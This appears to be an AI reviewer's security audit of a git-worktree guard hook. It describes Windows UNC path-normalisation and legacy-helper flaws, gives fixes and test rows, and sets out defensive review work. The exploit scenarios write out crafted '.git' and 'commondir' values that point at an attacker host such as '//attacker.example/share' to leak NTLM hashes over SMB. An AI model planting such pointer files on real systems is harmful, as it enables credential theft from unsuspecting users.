# Security Audit, pass 3 (final, fresh context): issue #259 change set (uncommitted, fix/259-codegraph-guard-fail-open)

Reviewer: security-auditor, 2026-11-05
Contract: `.claude/concepts/2026-11-05-codegraph-guard-fail-open.md` (approved)
Earlier passes: `review-security-auditor.md`, `review-security-auditor-pass2.md` (P2-W1, P2-N1..N5)
HELD for the user and not reported as regressions: W2 (no owner check on Windows / per-user parent folder) and the
W4 refusal-to-finding change.

Method: a static read of `_project_paths.py` (`_remote_host`, `_hop_allowed`, `_gitdir_pointer`, `_read_gitdir_line`,
`_git_file_kind`, `_classify`, `worktree_own_root`), the guard's inline copies and its callers, the `_claude_paths.py`
bridge, the installer's `_codegraph_index_notes` and manifest checks, the reset hook, and HEAD's `_project_paths.py`.
Offline probes only (`ntpath.normpath`, `nt._getfullpathname`, and the helper's `_remote_host` / `_hop_allowed`
imported by path, under Python 3.12.10). No path in a probe was opened, so nothing reached the network.

## WARN

### P3-W1. The commondir hop checks the joined path BEFORE normalising it; `realpath` then collapses `\\?\UNC\<own host>\..` onto another host and opens it
- `.claude/hooks/_project_paths.py:621-625`
  ```python
  joined = os.path.join(target, relative) if relative else ""
  if not joined or not _hop_allowed(relative, folder) or not _hop_allowed(joined, folder):
      return "undecidable", None
  common = os.path.realpath(joined)          # normpath + _getfinalpathname (CreateFileW) happen here
  if not _hop_allowed(common, os.path.realpath(folder)) or not os.path.isdir(common):
  ```
- The first hop (`:614`, and `_gitdir_pointer:590`, guard `:397`, `_claude_paths.py:144`) normalises and THEN checks,
  so it is not affected. Only the commondir hop is.

Under Python 3.12 `ntpath.normpath` lets `..` climb out of the server part of a `\\?\UNC\` path (probe output):

| input | `_remote_host(input)` | `ntpath.normpath(input)` | host after |
|---|---|---|---|
| `\\?\UNC\srv\..\attacker\s` | `srv` | `\\?\UNC\attacker\s` | `attacker` |
| `\\?\UNC\srv\share\..\..\attacker\s` | `srv` | `\\?\UNC\attacker\s` | `attacker` |
| `\\?\UNC\srv\share\a\b\..\..\..\..\attacker\s` | `srv` | `\\?\UNC\attacker\s` | `attacker` |
| `//?/UNC/srv/../attacker/s` | `srv` | `\\?\UNC\attacker\s` | `attacker` |
| `\\srv\share\..\..\attacker\x` (plain UNC) | `srv` | `\\srv\share\attacker\x` | `srv` (safe) |

`ntpath.realpath` (3.12 `ntpath.py:705-727`) starts with `path = normpath(path)` and then calls
`_getfinalpathname`, which opens the path. A `\\?\` path skips Win32 normalisation, so the open goes to
`\??\UNC\attacker\...`, i.e. SMB to the attacker host. The refusal at `:625` runs on the result, after the open.

**Precondition.** The same-host exemption must be live: the tree's own path is a literal UNC path on host `srv`
(a mapped drive letter does NOT qualify: `abspath` keeps `Z:` and every UNC target is refused). The attacker controls
a `.git` file and its admin folder somewhere in that tree (for example an extracted archive the agent `cd`s into).

**Exploit scenario.**
1. Victim works in `\\srv\team\repo`. The attacker's archive, extracted to `\\srv\team\repo\vendor\pkg`, holds
   `.git` = `gitdir: evil/.git/worktrees/x` and `evil/.git/worktrees/x/commondir` = `//?/UNC/srv/../attacker/s/.git`.
   (Variant with no host text in commondir at all: `.git` = `gitdir: //?/UNC/srv/team/repo/vendor/pkg/evil/.git/worktrees/x`,
   allowed as same host, and `commondir` = `../../../../../../../../../attacker/s/.git`: `relative` has no host,
   `joined` still names `srv`, normpath of the joined `\\?\UNC\...` path climbs to `attacker`.)
2. The session cwd is that folder; the first source Read of a turn runs `index_verdict` -> `_main_candidate` ->
   `main_checkout_root` -> `_git_file_kind`.
3. `relative` names `srv` (or nothing), `joined` names `srv`: both checks pass. `realpath(joined)` opens
   `\\?\UNC\attacker\s\.git`: NetNTLMv2 of the victim goes to `attacker`; the hook stalls for the SMB timeout. Line
   625 then refuses a path it has already touched.

**Impact.** NTLM hash disclosure (relay / offline crack) and a hook stall. Narrow precondition (tree on a literal UNC
path), hence WARN, but it is a bypass of the exact refusal this change set claims at every hop, and the current tests
(`test_codegraph_first_guard.py:1130-1201`) contain no `..` row.

**Fix (all four copies of `_hop_allowed`: `_project_paths.py:577`, guard `:382`, `_claude_paths.py:126`, installer `:2580`).**
- `_hop_allowed` checks BOTH the text and its normal form:
  `return all(h is None or (bool(h) and h == _remote_host(own)) for h in (_remote_host(target), _remote_host(os.path.normpath(target))))`.
  Optionally also refuse any UNC or device path that holds a `..` component at all (git never writes one there).
- `_git_file_kind`: `joined = os.path.normpath(os.path.join(target, relative))` before the check, so the text
  checked is the text `realpath` opens.
- Test rows, own path `//<FAKE_HOST>/share/repo`: commondir `//?/UNC/<FAKE_HOST>/../<OTHER_HOST>/s/.git`,
  `\\?\UNC\<FAKE_HOST>\share\..\..\<OTHER_HOST>\s`, and the relative-climb variant behind a same-host `//?/UNC/` gitdir;
  assert `undecidable` and that `watch_fake_host` recorded nothing for `<OTHER_HOST>`. Same rows for the first hop as
  regression pins.

### P3-W2. With a `_project_paths.py` from an earlier release the guard still calls that helper's unprotected `main_checkout_root` / `tree_kind` first; the caller-side `_hop_allowed` runs after the helper has already probed the host, at BOTH hops
- Binding: `codegraph-first-guard.py:78-80` binds `tree_kind` / `main_checkout_root` from ANY helper version.
- Calls: `_main_candidate` `:442-446` (`_pp_main_checkout_root(path)` first, then `_hop_allowed(found, path)`);
  `index_verdict` rule 2 `:489-492` (`_pp_tree_kind(root)`, then `_pp_main_checkout_root(root)`, then `_hop_allowed`).
- Old helper (HEAD, `git show HEAD:.claude/hooks/_project_paths.py:561-577`, released since 0.8.0 commit 5b73a8f):
  `fh.readline()` of `.git`, `os.path.isdir(target)` on the raw gitdir, `fh.readline()` of `commondir`,
  `os.path.realpath(...)` and `os.path.isdir(common)`, with no host check at either hop.
- How the pair arises: the add-on install keeps an existing helper as it is (`auto_improve_finish_install.py:2294-2296`,
  `action = "keep-existing"`), and the guard's own comment (`:76-77`) names this configuration as supported.

**Exploit scenario.** Project installed the hooks at 0.8.x (old helper in `.claude/hooks/`), then installs this
release's codegraph add-on (new guard, helper kept). The agent `cd`s into an extracted archive whose `.git` says
`gitdir: //attacker.example/share/.git/worktrees/x` (no commondir trick needed). First source Read:
`_main_candidate` -> old `main_checkout_root` -> `isdir('//attacker.example/share/.git/worktrees/x')` -> SMB, hash
leaked. The guard's `_hop_allowed(found, path)` then discards the answer, but the contact has happened. So in this
configuration even the FIRST-hop W3 fix is void for the guard. Same mitigating fact as W3 (git reads the same file),
hence WARN.

**Why the tests pass.** `run_commondir_callers` (`test_codegraph_first_guard.py:1223-1236`) models the older helper as
`lambda path: remote`, a stub that RETURNS the remote path without probing it. The real older helper probes before
returning. The test asserts what happens after the helper returns, which is not where the leak is.

**Fix.** Gate the tree functions on the presence of the refusal, as the installer already does with
`WORKTREE_OWN_ROOT_NATIVE` (`_claude_paths.py:179-181`, installer `:2590`):
```python
_pp_has_refusal = _pp is not None and callable(getattr(_pp, "_hop_allowed", None))
_pp_tree_kind = getattr(_pp, "tree_kind", None) if _pp_has_refusal else None
_pp_main_checkout_root = getattr(_pp, "main_checkout_root", None) if _pp_has_refusal else None
```
With an older helper `_main_candidate` then uses the inline gitdir text (checked, nothing opened) and rule 2 does not
fire (`index-other-tree` unavailable, already the documented behaviour for a helper lacking the functions). Replace
the lambda stubs with a stub that records a probe of the path it is given (or load HEAD's helper text into a temp
module under `watch_fake_host`) and assert the guard never calls it.

## NIT

- **P3-N1. `TICKET_RE` has an unescaped dot.** `codegraph-turn-reset.py:46`
  `re.compile(r"ticket-[0-9a-f]{64}|.tmp-[0-9a-f]{16}")`: `.` matches any character, so every prompt deletes any plain
  file named `<any char>tmp-<16 hex>` in the CURRENT session folder. Confined to the session folder, plain non-link
  files only, `fullmatch`, so no escape; `KNOWN_FILE_RE` (`:50`) is correctly escaped. Fix: `\.tmp-[0-9a-f]{16}`.
  Side note: deleting `.tmp-*` on every prompt can race a concurrent tracker/guard atomic write (a background subagent),
  whose `os.replace` then fails; the outcome is a logged miss or fail-open, not an escalation.
- **P3-N2. A prerequisite name ending in `_` yields an ambiguous grant.** `auto_improve_finish_install.py:235`
  `[A-Za-z0-9][A-Za-z0-9_-]*` plus "no `__`" admits `x_`, whose grant `mcp__x___*` may be split by the host as server
  `x`, tool `_*`: a grant on a server that is not the prerequisite. Plugin-authored manifest only. Fix:
  `[A-Za-z0-9](?:[A-Za-z0-9_-]*[A-Za-z0-9-])?` (no trailing `_`), keeping the `__` ban.
- **P2-N5 still open (optional).** `C:foo` drive-relative gitdir is accepted by `_gitdir_pointer` / `_git_file_kind`;
  local only.
- **Residual, out of scope for a text check.** A LOCAL path component that is a symbolic link to a UNC target (L2R
  evaluation is on by default) is followed by `isdir(target)` (`:615`), `isfile(commondir)` (`:618`) and
  `realpath(joined)` (`:624`) before the post-`realpath` check at `:625`. Needs symlink-creation rights at
  extraction and is followed equally by git, Explorer and the agent's own Read; documenting it is enough.

## Verified closed

- **P2-W1 (commondir to a UNC host), text forms.** `//host/share`, `\\host\share`, `\\?\UNC\host\share`,
  `\\?\unc\...`, `\\.\host` / `\\.\UNC\...` (host `""`, refused), `\\?\C:\...` (refused), `\??\UNC\...` (rooted on the
  tree's drive, `D:\??\...`, an invalid Win32 name, no network), `///host` (host parsed, refused), mixed separators,
  leading/trailing whitespace (stripped before the check), a relative commondir joined onto a local target (keeps the
  drive), drive-letter `C://host` (becomes `C:\host`), trailing-dot or case variants of the host and IP-vs-name
  (strict lower-cased equality: refused, the safe direction). All are refused or harmless before any probe, except the
  `..` collapse in P3-W1.
- **Same-host exemption.** The tree's own path is the abspath of the payload cwd / project, never pointer data, so an
  attacker cannot make it name their host. A mapped drive (`Z:`) never qualifies (host `None`), so for such trees every
  UNC hop is refused; `_hop_allowed(common, realpath(folder))` at `:625` compares in the resolved form on both sides.
  Live only for a literal UNC tree; see P3-W1.
- **Installer.** `_codegraph_index_notes` (`:2589-2591`) uses the helper only when `WORKTREE_OWN_ROOT_NATIVE`, which
  only the helper carrying the refusal has; its caller-side checks (`:2598`, `:2603`, `:2634`) gate every later
  `lstat` / `isdir` / `realpath`. The `_claude_paths` inline walk mirrors the guard's. Affected only by P3-W1 (shared
  helper).
- **4096-byte cap and strict UTF-8 (P2-N1, P2-N2).** `_read_gitdir_line` (`:596-603`) now serves `.git` AND `commondir`;
  guard `:415-417` and `_claude_paths.py:162-164` are text-equivalent. A 4096-byte file with no newline is undecidable
  (the safe direction); a 4095-byte file with no newline is read whole (complete, correct); a newline at byte 4096 yields
  the 4095-byte line; a multi-byte character can only be cut when no newline was read, which is refused. Strict
  `decode("utf-8")`, `UnicodeError` caught; a BOM fails the `gitdir:` prefix (undecidable).
- **Pruner (P2-N3).** `KNOWN_FILE_RE` (`reset:50`) admits `\.tmp-[0-9a-f]{16}` under `fullmatch`; `_eligible_files`
  and `_remove_folder` still require a plain, non-link file whose real parent is the folder, re-checked before each
  `os.remove`, and `os.rmdir` only. Nothing beyond the listed names can be deleted.
- **Prerequisite grammar (P2-N4).** `_SERVER_NAME_RE.fullmatch` plus the `__` ban (`:2032-2033`); `_grant_server`
  (`:2079-2084`) is exact string equality. `*`, `mcp__*`, padded or look-alike names are refused. See P3-N2 for the
  trailing-underscore edge.
- **Other path operations in the diff.** The added `open` / `replace` / `remove` / `mkdir` / `lstat` / `listdir` /
  `realpath` lines are the session-folder writer and reader, the pruner, the index lstat and the settings readers on a
  checked candidate. No new write, delete or follow outside those.

## Verdict

NEEDS FIXES. P3-W1: the commondir hop checks un-normalised text and `realpath` opens the normalised one, so
`\\?\UNC\<own host>\..\<other host>` reaches another host when the tree is on a UNC path. P3-W2: with a helper from an
earlier release the guard calls that helper's unprotected tree functions first, so the caller-side checks come after
the contact. Both are WARN (narrow or git-equivalent preconditions), neither is a merge-blocking exploit on a default
local checkout.
